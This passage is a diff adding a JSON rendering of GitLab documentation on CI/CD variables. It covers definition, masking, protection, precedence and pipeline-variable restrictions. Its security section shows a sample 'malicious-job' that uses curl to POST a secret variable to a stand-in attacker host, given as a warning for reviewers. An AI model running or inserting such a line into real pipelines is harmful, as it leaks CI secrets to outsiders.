@@ -1,0 +1,1233 @@
+{
+  "title": "CI/CD variables",
+  "description": "Configuration, usage, and security.",
+  "blocks": [
+    {
+      "text": "Availability: Tier: Free, Premium, Ultimate; Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated",
+      "kind": "paragraph"
+    },
+    {
+      "text": "CI/CD variables are a type of environment variable. You can use them to:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "Control the behavior of jobs and pipelines.",
+        "Store values you want to re-use, for example in job scripts.",
+        "Avoid hard-coding values in your `.gitlab-ci.yml` file."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "Variable names are limited by the shell the runner uses to execute scripts. Each shell has its own set of reserved variable names.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "To ensure consistent behavior, you should always put variable values in single or double quotes. Variables are internally parsed by the Psych YAML parser, so quoted and unquoted variables might be parsed differently. For example:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "`VAR1: 012345` is interpreted as an octal value, so the value becomes `5349`.",
+        "`VAR1: \"012345\"` is parsed as a string with a value of `012345`.",
+        "`VAR1: 019` is parsed as the string `\"019\"` and not as octal, because `9` is not a valid octal digit. Octal parsing only applies when all digits are 0-7."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "For more information about advanced use of GitLab CI/CD, see 7 advanced GitLab CI workflow hacks shared by GitLab engineers.",
+      "kind": "paragraph"
+    },
+    {
+      "level": 2,
+      "text": "Predefined CI/CD variables",
+      "anchor": "predefined-cicd-variables",
+      "kind": "heading"
+    },
+    {
+      "text": "GitLab CI/CD makes a set of predefined CI/CD variables available for use in pipeline configuration and job scripts. These variables contain information about the job, pipeline, and other values you might need when the pipeline is triggered or running.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "You can use predefined CI/CD variables in your `.gitlab-ci.yml` without declaring them first. For example:",
+      "kind": "paragraph"
+    },
+    {
+      "language": "yaml",
+      "code": "job1:\n  stage: test\n  script:\n    - echo \"The job's stage is '$CI_JOB_STAGE'\"",
+      "kind": "code"
+    },
+    {
+      "text": "The script in this example outputs `The job's stage is 'test'`.",
+      "kind": "paragraph"
+    },
+    {
+      "level": 2,
+      "text": "Define a CI/CD variable in the .gitlab-ci.yml file",
+      "anchor": "define-a-cicd-variable-in-the-gitlab-ciyml-file",
+      "kind": "heading"
+    },
+    {
+      "text": "To create a CI/CD variable in the `.gitlab-ci.yml` file, define the variable and value with the `variables` keyword.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Variables saved in the `.gitlab-ci.yml` file are visible to all users with access to the repository, and should store only non-sensitive project configuration. For example, the URL of a database saved in a `DATABASE_URL` variable. Sensitive variables containing values like secrets or keys should be added in the UI.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "You can define `variables` in:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "A job: The variable is only available in that job’s `script`, `before_script`, or `after_script` sections, and with some job keywords.",
+        "The top-level of the `.gitlab-ci.yml` file: The variable is available as a default for all jobs in a pipeline, unless a job defines a variable with the same name. The job’s variable takes precedence."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "In both cases, you cannot use these variables with global keywords.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "For example:",
+      "kind": "paragraph"
+    },
+    {
+      "language": "yaml",
+      "code": "variables:\n  ALL_JOBS_VAR: \"A default variable\"\n\njob1:\n  variables:\n    JOB1_VAR: \"Job 1 variable\"\n  script:\n    - echo \"Variables are '$ALL_JOBS_VAR' and '$JOB1_VAR'\"\n\njob2:\n  variables:\n    ALL_JOBS_VAR: \"Different value than default\"\n    JOB2_VAR: \"Job 2 variable\"\n  script:\n    - echo \"Variables are '$ALL_JOBS_VAR', '$JOB2_VAR', and '$JOB1_VAR'\"",
+      "kind": "code"
+    },
+    {
+      "text": "In this example:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "`job1` outputs: `Variables are 'A default variable' and 'Job 1 variable'`",
+        "`job2` outputs: `Variables are 'Different value than default', 'Job 2 variable', and ''`"
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "Use the `value` and `description` keywords to define variables that are prefilled for manually-triggered pipelines.",
+      "kind": "paragraph"
+    },
+    {
+      "level": 3,
+      "text": "Skip default variables in a single job",
+      "anchor": "skip-default-variables-in-a-single-job",
+      "kind": "heading"
+    },
+    {
+      "text": "If you don’t want default variables to be available in a job, set `variables` to `{}`:",
+      "kind": "paragraph"
+    },
+    {
+      "language": "yaml",
+      "code": "variables:\n  DEFAULT_VAR: \"A default variable\"\n\njob1:\n  variables: {}\n  script:\n    - echo This job does not need any variables",
+      "kind": "code"
+    },
+    {
+      "level": 2,
+      "text": "Define a CI/CD variable in the UI",
+      "anchor": "define-a-cicd-variable-in-the-ui",
+      "kind": "heading"
+    },
+    {
+      "text": "Sensitive variables like tokens or passwords should be stored in the settings in the UI, not in the `.gitlab-ci.yml` file.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "By default, pipelines from forked projects can’t access the CI/CD variables available to the parent project. If you run a merge request pipeline in the parent project for a merge request from a fork, all variables become available to the pipeline.",
+      "kind": "paragraph"
+    },
+    {
+      "level": 3,
+      "text": "For a project",
+      "anchor": "for-a-project",
+      "kind": "heading"
+    },
+    {
+      "label": "History",
+      "text": "- Default visibility changed from Visible to Masked in GitLab 18.3.",
+      "kind": "callout"
+    },
+    {
+      "text": "You can add CI/CD variables to a project’s settings. Projects can have a maximum of 8000 CI/CD variables.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Prerequisites:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "You must be a project member with the Maintainer role."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "To add or update variables in the project settings:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": true,
+      "items": [
+        "In the top bar, select Search or go to and find your project.",
+        "In the left sidebar, select Settings > CI/CD.",
+        "Expand Variables.",
+        "Select Add variable and fill in the details:\n  - Key: Must be one line, with no spaces, using only letters, numbers, or `_`.\n  - Value: The value is limited to 10,000 characters, but also bounded by any limits in the runner’s operating system. The value has extra limitations if Visibility is set to Masked or Masked and hidden.\n  - Type: `Variable` (default) or `File`.\n  - Environment scope: Optional. All (default) (`*`), a specific environment, or a wildcard environment scope.\n  - Protect variable Optional. If selected, the variable is only available in pipelines that run on protected branches or protected tags.\n  - Visibility: Select Visible, Masked (default), or Masked and hidden.\n  - Expand variable reference: Optional. If selected, the variable can reference another variable. It is not possible to reference another variable if Visibility is set to Masked or Masked and hidden."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "Alternatively, project variables can be added by using the API.",
+      "kind": "paragraph"
+    },
+    {
+      "level": 3,
+      "text": "For a group",
+      "anchor": "for-a-group",
+      "kind": "heading"
+    },
+    {
+      "label": "History",
+      "text": "- Default visibility changed from Visible to Masked in GitLab 18.3.",
+      "kind": "callout"
+    },
+    {
+      "text": "You can make a CI/CD variable available to all projects in a group. Groups can have a maximum of 30000 CI/CD variables.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Prerequisites:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "You must be a group member with the Owner role."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "To add a group variable:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": true,
+      "items": [
+        "In the top bar, select Search or go to and find your group.",
+        "In the left sidebar, select Settings > CI/CD.",
+        "Expand Variables.",
+        "Select Add variable and fill in the details:\n  - Key: Must be one line, with no spaces, using only letters, numbers, or `_`.\n  - Value: The value is limited to 10,000 characters, but also bounded by any limits in the runner’s operating system. The value has extra limitations if Visibility is set to Masked or Masked and hidden.\n  - Type: `Variable` (default) or `File`.\n  - Protect variable Optional. If selected, the variable is only available in pipelines that run on protected branches or protected tags.\n  - Visibility: Select Visible, Masked (default), Masked and hidden.\n  - Expand variable reference: Optional. If selected, the variable can reference another variable. It is not possible to reference another variable if Visibility is set to Masked or Masked and hidden."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "The group variables that are available in a project are listed in the project’s Settings > CI/CD > Variables section. Variables from subgroups are recursively inherited.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Alternatively, group variables can be added by using the API.",
+      "kind": "paragraph"
+    },
+    {
+      "level": 4,
+      "text": "Environment scope",
+      "anchor": "environment-scope",
+      "kind": "heading"
+    },
+    {
+      "text": "Availability: Tier: Premium, Ultimate",
+      "kind": "paragraph"
+    },
+    {
+      "text": "To set a group CI/CD variable to only be available for certain environments:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": true,
+      "items": [
+        "In the top bar, select Search or go to and find your group.",
+        "In the left sidebar, select Settings > CI/CD.",
+        "Expand Variables.",
+        "To the right of the variable, select Edit ( ).",
+        "For Environment scope, select All (default) (`*`), a specific environment, or a wildcard environment scope."
+      ],
+      "kind": "list"
+    },
+    {
+      "level": 3,
+      "text": "For an instance",
+      "anchor": "for-an-instance",
+      "kind": "heading"
+    },
+    {
+      "text": "Availability: Tier: Free, Premium, Ultimate; Offering: GitLab Self-Managed, GitLab Dedicated",
+      "kind": "paragraph"
+    },
+    {
+      "label": "History",
+      "text": "- Default visibility changed from Visible to Masked in GitLab 18.3.\n- Masked and hidden option introduced in GitLab 19.0.",
+      "kind": "callout"
+    },
+    {
+      "text": "You can make a CI/CD variable available to all projects and groups in a GitLab instance.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Prerequisites:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "You must have administrator access to the instance."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "To add an instance variable:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": true,
+      "items": [
+        "In the upper-right corner, select Admin.",
+        "In the left sidebar, select Settings > CI/CD.",
+        "Expand Variables.",
+        "Select Add variable and fill in the details:\n  - Key: Must be one line, with no spaces, using only letters, numbers, or `_`.\n  - Value: The value is limited to 10,000 characters, but also bounded by any limits in the runner’s operating system. No other limitations if Visibility set to Visible.\n  - Type: `Variable` (default) or `File`.\n  - Protect variable Optional. If selected, the variable is only available in pipelines that run on protected branches or tags.\n  - Visibility: Select Visible, Masked (default), or Masked and hidden.\n  - Expand variable reference: Optional. If selected, the variable can reference another variable. It is not possible to reference another variable if Visibility is set to Masked or Masked and hidden."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "Alternatively, instance variables can be added by using the API.",
+      "kind": "paragraph"
+    },
+    {
+      "level": 2,
+      "text": "CI/CD variable security",
+      "anchor": "cicd-variable-security",
+      "kind": "heading"
+    },
+    {
+      "text": "Code pushed to the `.gitlab-ci.yml` file could compromise your variables. Variables could be accidentally exposed in a job log, or maliciously sent to a third party server.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Review all merge requests that introduce changes to the `.gitlab-ci.yml` file before you:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "Run a pipeline in the parent project for a merge request submitted from a forked project.",
+        "Merge the changes."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "Review the `.gitlab-ci.yml` file of imported projects before you add files or run pipelines against them.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "The following example shows malicious code in a `.gitlab-ci.yml` file:",
+      "kind": "paragraph"
+    },
+    {
+      "language": "yaml",
+      "code": "accidental-leak-job:\n  script:                                         # Password exposed accidentally\n    - echo \"This script logs into the DB with $USER $PASSWORD\"\n    - db-login $USER $PASSWORD\n\nmalicious-job:\n  script:                                         # Secret exposed maliciously\n    - curl --request POST --data \"secret_variable=$SECRET_VARIABLE\" \"https://maliciouswebsite.abcd/\"",
+      "kind": "code"
+    },
+    {
+      "text": "To help reduce the risk of accidentally leaking secrets through scripts like in `accidental-leak-job`, all variables containing sensitive information should always be masked in job logs. You can also limit a variable to protected branches and tags only.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Alternatively, connect with an external secrets management provider to store and retrieve secrets.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Malicious scripts like in `malicious-job` must be caught during the review process. Reviewers should never trigger a pipeline when they find code like this, because malicious code can compromise both masked and protected variables.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Variable values are encrypted using `aes-256-cbc` and stored in the database. This data can be read and decrypted with a valid secrets file.",
+      "kind": "paragraph"
+    },
+    {
+      "level": 3,
+      "text": "Mask a CI/CD variable",
+      "anchor": "mask-a-cicd-variable",
+      "kind": "heading"
+    },
+    {
+      "label": "Warning",
+      "text": "Masking a CI/CD variable is not a guaranteed way to prevent malicious users from accessing variable values. To ensure security of sensitive information, consider using external secrets and file type variables to prevent commands such as `env` or `printenv` from printing secret variables.",
+      "kind": "callout"
+    },
+    {
+      "text": "You can mask a CI/CD variable for a project, group, or instance to prevent its value from appearing in job logs. When a job outputs the value of a masked variable, the value is replaced with `[MASKED]` in the job log. In some cases, the `[MASKED]` value could be followed by `x` characters as well.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Prerequisites:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "You must have the same role or access level as required to add a CI/CD variable in the UI."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "To mask a variable:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": true,
+      "items": [
+        "For the group, project, or in the Admin area, select Settings > CI/CD.",
+        "Expand Variables.",
+        "Next to the variable you want to protect, select Edit.",
+        "Under Visibility, select Mask variable.",
+        "Recommended. Clear the Expand variable reference checkbox. If variable expansion is enabled, the only non-alphanumeric characters you can use in the variable value are: `_`, `:`, `@`, `-`, `+`, `.`, `~`, `=`, `/`, and `~`. When the setting is disabled, all characters can be used.",
+        "Select Update variable."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "The value of the variable must:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "Be a single line with no spaces.",
+        "Be 8 characters or longer.",
+        "Not match the name of an existing predefined or custom CI/CD variable."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "If a process outputs the value in a slightly modified way, the value can’t be masked. For example, if the shell adds `\\` to escape special characters, the value isn’t masked:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "Example masked variable value: `My[value]`",
+        "This output would not be masked: `My\\[value\\]`"
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "When `CI_DEBUG_SERVICES` is enabled, the variable value might be revealed. For more information, see service container logging.",
+      "kind": "paragraph"
+    },
+    {
+      "level": 3,
+      "text": "Hide a CI/CD variable",
+      "anchor": "hide-a-cicd-variable",
+      "kind": "heading"
+    },
+    {
+      "label": "History",
+      "text": "- Introduced in GitLab 17.4 with a feature flag named `ci_hidden_variables`. Enabled by default.\n- Generally available in GitLab 17.6. Feature flag `ci_hidden_variables` removed.",
+      "kind": "callout"
+    },
+    {
+      "text": "In addition to masking, you can also prevent the value of CI/CD variables from being revealed in the CI/CD settings page. Hiding a variable is only possible when creating a new variable, you cannot update an existing variable to be hidden.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Prerequisites:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "You must have the same role or access level as required to add a CI/CD variable in the UI.",
+        "The variable value must match the requirements for masked variables."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "To hide a variable, select Masked and hidden in the Visibility section when you add a new CI/CD variable in the UI. After you save the variable, the variable can be used in CI/CD pipelines, but cannot be revealed in the UI again.",
+      "kind": "paragraph"
+    },
+    {
+      "level": 3,
+      "text": "Protect a CI/CD variable",
+      "anchor": "protect-a-cicd-variable",
+      "kind": "heading"
+    },
+    {
+      "text": "You can configure a project, group, or instance CI/CD variable to be available only to pipelines that run on protected branches or protected tags.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Merged results pipelines and merge request pipelines can optionally access protected variables.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Prerequisites:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "You must have the same role or access level as required to add a CI/CD variable in the UI."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "To set a variable as protected:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": true,
+      "items": [
+        "For the project or group, go to Settings > CI/CD.",
+        "Expand Variables.",
+        "Next to the variable you want to protect, select Edit.",
+        "Select the Protect variable checkbox.",
+        "Select Update variable."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "The variable is available for all subsequent pipelines.",
+      "kind": "paragraph"
+    },
+    {
+      "level": 3,
+      "text": "Use file type CI/CD variables",
+      "anchor": "use-file-type-cicd-variables",
+      "kind": "heading"
+    },
+    {
+      "text": "All predefined CI/CD variables and variables defined in the `.gitlab-ci.yml` file are “variable” type (`\"variable_type\": \"env_var\"` in the API).",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Variable type variables:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "Consist of a key and value pair.",
+        "Are made available in jobs as environment variables, with:\n  - The CI/CD variable key as the environment variable name.\n  - The CI/CD variable value as the environment variable value."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "Project, group, and instance CI/CD variables are “variable” type by default, but can optionally be set as a “file” type (`\"variable_type\": \"file\"` in the API). File type variables:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "Consist of a key, value, and file.",
+        "Are made available in jobs as environment variables, with:\n  - The CI/CD variable key as the environment variable name.\n  - The CI/CD variable value saved to a temporary file.\n  - The path to the temporary file as the environment variable value."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "Use file type CI/CD variables for tools that need a file as input.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "For example, the AWS CLI and `kubectl` are both tools that use `File` type variables for configuration. If you are using `kubectl` with:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "A variable with a key of `KUBE_URL` and `https://example.com` as the value.",
+        "A file type variable with a key of `KUBE_CA_PEM` and a certificate as the value."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "Pass `KUBE_URL` as a `--server` option, which accepts a variable, and pass `$KUBE_CA_PEM` as a `--certificate-authority` option, which accepts a path to a file:",
+      "kind": "paragraph"
+    },
+    {
+      "language": "shell",
+      "code": "kubectl config set-cluster e2e --server=\"$KUBE_URL\" --certificate-authority=\"$KUBE_CA_PEM\"",
+      "kind": "code"
+    },
+    {
+      "level": 4,
+      "text": "Use a .gitlab-ci.yml variable as a file type variable",
+      "anchor": "use-a-gitlab-ciyml-variable-as-a-file-type-variable",
+      "kind": "heading"
+    },
+    {
+      "text": "You cannot set a CI/CD variable defined in the `.gitlab-ci.yml` file as a file type variable. If you have a tool that requires a file path as an input, but you want to use a variable defined in the `.gitlab-ci.yml`:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "Run a command that saves the value of the variable in a file.",
+        "Use that file with your tool."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "For example:",
+      "kind": "paragraph"
+    },
+    {
+      "language": "yaml",
+      "code": "variables:\n  SITE_URL: \"https://gitlab.example.com\"\n\njob:\n  script:\n    - echo \"$SITE_URL\" > \"site-url.txt\"\n    - mytool --url-file=\"site-url.txt\"",
+      "kind": "code"
+    },
+    {
+      "level": 2,
+      "text": "Allow CI/CD variable expansion",
+      "anchor": "allow-cicd-variable-expansion",
+      "kind": "heading"
+    },
+    {
+      "label": "History",
+      "text": "- Expand variable option disabled by default in GitLab 18.6.",
+      "kind": "callout"
+    },
+    {
+      "text": "You can set a variable to treat values with the `$` character as a reference to another variable. When the pipeline runs, the reference expands to use the value of the referenced variable.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "CI/CD variables defined in the UI are not expanded by default. For CI/CD variables defined in the `.gitlab-ci.yml` file, control variable expansion with the `variables:expand` keyword.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Prerequisites:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "You must have the same role or access level as required to add a CI/CD variable in the UI."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "To enable variable expansion for the variable:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": true,
+      "items": [
+        "For the project or group, go to Settings > CI/CD.",
+        "Expand Variables.",
+        "Next to the variable you do not want expanded, select Edit.",
+        "Select the Expand variable reference checkbox.",
+        "Select Update variable."
+      ],
+      "kind": "list"
+    },
+    {
+      "label": "Note",
+      "text": "Do not mask a variable value if you want to use variable expansion. If both masking and variable expansion are combined, character limitations prevent the use of the `$` to reference other variables.",
+      "kind": "callout"
+    },
+    {
+      "level": 2,
+      "text": "CI/CD variable precedence",
+      "anchor": "cicd-variable-precedence",
+      "kind": "heading"
+    },
+    {
+      "text": "You can define CI/CD variables with the same name in more than one place. When a job runs, GitLab uses the value from the source with the highest precedence. The highest-precedence value that exists overrides all lower-precedence values.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "From highest to lowest, the order of precedence is:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": true,
+      "items": [
+        "Variables defined in a pipeline execution policy or a scan execution policy. These variables apply only to the jobs a policy adds to a pipeline, not to the other jobs in the pipeline.",
+        "Manual job variables, set when you run a manual job.",
+        "Pipeline variables, from:\n  - The Run pipeline page\n  - A pipeline schedule\n  - The pipelines API\n  - The triggers API\n  - The `ci.variable` push option\n  - An upstream pipeline",
+        "Project variables.",
+        "Group variables. If the same variable name exists in a group and its subgroups, the job uses the value from the closest subgroup. For example, if you have `Group > Subgroup 1 > Subgroup 2 > Project`, the variable defined in `Subgroup 2` takes precedence.",
+        "Instance variables.",
+        "Variables from `dotenv` reports in jobs listed in `dependencies` or `needs`.",
+        "Variables in the `.gitlab-ci.yml` file, from highest to lowest precedence:\n  1. `rules:variables` in the job.\n  1. `variables` in the job.\n  1. `workflow:rules:variables`.\n  1. Default `variables` at the top level of the file.",
+        "Deployment variables.",
+        "Predefined variables. Not all predefined variables have the lowest precedence. You cannot override `CI_ENVIRONMENT_ID`, `CI_ENVIRONMENT_SLUG`, `CI_ENVIRONMENT_URL`, or `CI_PAGES_URL`."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "For example, your project has a `DEPLOY_TARGET` project variable set to `production`, and this `.gitlab-ci.yml` file:",
+      "kind": "paragraph"
+    },
+    {
+      "language": "yaml",
+      "code": "variables:\n  DEPLOY_TARGET: \"staging\"\n\ndeploy:\n  variables:\n    DEPLOY_TARGET: \"review\"\n  script:\n    - echo \"Deploying to $DEPLOY_TARGET\"",
+      "kind": "code"
+    },
+    {
+      "text": "In this example:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "The `deploy` job prints `Deploying to production`, because a project variable outranks both values set in the `.gitlab-ci.yml` file.",
+        "Without the project variable, the job prints `Deploying to review`, because a variable defined in a job outranks a default variable.",
+        "If you run the pipeline manually and set `DEPLOY_TARGET` to `canary`, the job prints `Deploying to canary`, because a pipeline variable outranks a project variable."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "Additional details:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "Values from `secrets` are not part of this order of precedence. The runner retrieves them from the external secrets manager when the job runs.",
+        "Inputs are not CI/CD variables and take no part in this order of precedence. GitLab replaces inputs with their values when the pipeline is created, so a project, group, or instance variable cannot change an input value."
+      ],
+      "kind": "list"
+    },
+    {
+      "level": 2,
+      "text": "Use pipeline variables",
+      "anchor": "use-pipeline-variables",
+      "kind": "heading"
+    },
+    {
+      "text": "Pipeline variables are variables that are specified when running a new pipeline.",
+      "kind": "paragraph"
+    },
+    {
+      "label": "Note",
+      "text": "In GitLab 17.7 and later, pipeline inputs are recommended over passing pipeline variables. For enhanced security, you should disable pipeline variables when using inputs.",
+      "kind": "callout"
+    },
+    {
+      "text": "Prerequisites:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "You must have the Developer role in the project."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "You can specify a pipeline variable when you:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "Run a pipeline manually in the UI.",
+        "Create a scheduled pipeline.",
+        "Create a pipeline by using the `pipelines` API endpoint.",
+        "Create a pipeline by using the `triggers` API endpoint.",
+        "Use push options.",
+        "Pass variables to a downstream pipeline by using either the `variables` keyword, `trigger:forward` keyword or `dotenv` variables."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "These variables have high precedence and can override variables with the same name defined in the project, group, or instance settings, or in the `.gitlab-ci.yml` file.",
+      "kind": "paragraph"
+    },
+    {
+      "label": "Warning",
+      "text": "You should avoid overriding predefined variables in most cases, as it can cause the pipeline to behave unexpectedly.",
+      "kind": "callout"
+    },
+    {
+      "level": 3,
+      "text": "Restrict pipeline variables",
+      "anchor": "restrict-pipeline-variables",
+      "kind": "heading"
+    },
+    {
+      "label": "History",
+      "text": "- Introduced in GitLab 17.1.\n- For GitLab.com, setting defaults updated for all new projects in new namespaces to `no_one_allowed` for `ci_pipeline_variables_minimum_override_role` in GitLab 17.7.",
+      "kind": "callout"
+    },
+    {
+      "text": "You can limit who can run pipelines with pipeline variables to specific user roles. When users with a lower role try to use pipeline variables, they receive an `Insufficient permissions to set pipeline variables` error message.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Prerequisites:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "You must have the Maintainer role in the project. If the minimum role was previously set to `owner` or `no_one_allowed`, then you must have the Owner role in the project."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "To limit the use of pipeline variables to only the Maintainer role and higher:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "Go to Settings > CI/CD > Variables.",
+        "Under Minimum role to use pipeline variables, select one of:\n  - `no_one_allowed`: No pipelines can run with pipeline variables. Default for new projects in new namespaces on GitLab.com. After the setting is at this value, only the Owner role can change it.\n  - `owner`: Only users with the Owner role can run pipelines with pipeline variables. After the setting is at this value, only the Owner role can change it.\n  - `maintainer`: Only users with the Maintainer or Owner role can run pipelines with pipeline variables. Default when not specified on GitLab Self-Managed and GitLab Dedicated.\n  - `developer`: Only users with the Developer, Maintainer, or Owner role can run pipelines with pipeline variables."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "You can also use the projects API to set the role for the `ci_pipeline_variables_minimum_override_role` setting.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "This restriction does not affect CI/CD variables from the project or group settings. Most jobs can still use the `variables` keyword in the YAML configuration. Jobs that use the `trigger` keyword to start a multi-project pipeline cannot, because these jobs pass their variables to the downstream pipeline as pipeline variables.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "For these jobs:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "The setting in the downstream project applies. GitLab checks the user’s role in the downstream project. Their role in the upstream project has no effect.",
+        "If their role is lower than the minimum role set in the downstream project, the trigger job fails with an `Insufficient permissions to set pipeline variables` error, and GitLab does not create the downstream pipeline.",
+        "A trigger job that passes no variables is not restricted. Trigger jobs inherit default `variables`, so a job with no `variables` keyword can still pass variables. To prevent this, use `inherit:variables: false`.",
+        "The restriction also applies to variables forwarded with `trigger:forward:pipeline_variables`. This forwarding is disabled by default."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "Jobs that trigger a parent-child pipeline in the same project are not restricted by this setting.",
+      "kind": "paragraph"
+    },
+    {
+      "level": 4,
+      "text": "Enable pipeline variable restriction for multiple projects",
+      "anchor": "enable-pipeline-variable-restriction-for-multiple-projects",
+      "kind": "heading"
+    },
+    {
+      "label": "History",
+      "text": "- Introduced in GitLab 18.4.",
+      "kind": "callout"
+    },
+    {
+      "text": "For groups with many projects, you can disable pipeline variables in all projects that don’t use them. This option sets the Minimum role to use pipeline variables setting to `no_one_allowed` for projects that have never used pipeline variables.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "Prerequisites:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "You must have the Owner role for the group."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "To enable the pipeline variable restriction setting in projects in the group:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": true,
+      "items": [
+        "In the top bar, select Search or go to and find your group.",
+        "In the left sidebar, select Settings > CI/CD.",
+        "Expand Variables.",
+        "In the Disable pipeline variables in projects that don’t use them section, select Start migration."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "The migration runs in the background. You receive an email notification when the migration is complete. Project maintainers can later change the setting for their individual projects if needed.",
+      "kind": "paragraph"
+    },
+    {
+      "level": 2,
+      "text": "Exporting variables",
+      "anchor": "exporting-variables",
+      "kind": "heading"
+    },
+    {
+      "text": "Scripts executed in separate shell contexts do not share exports, aliases, local function definitions, or any other local shell updates.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "This means that if a job fails, variables created by user-defined scripts are not exported.",
+      "kind": "paragraph"
+    },
+    {
+      "text": "When runners execute jobs defined in `.gitlab-ci.yml`:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "Scripts specified in `before_script` and the main script are executed together in a single shell context, and are concatenated.",
+        "Scripts specified in `after_script` run in a shell context completely separate to the `before_script` and the specified scripts."
+      ],
+      "kind": "list"
+    },
+    {
+      "text": "Regardless of the shell the scripts are executed in, the runner output includes:",
+      "kind": "paragraph"
+    },
+    {
+      "ordered": false,
+      "items": [
+        "Predefined variables.",
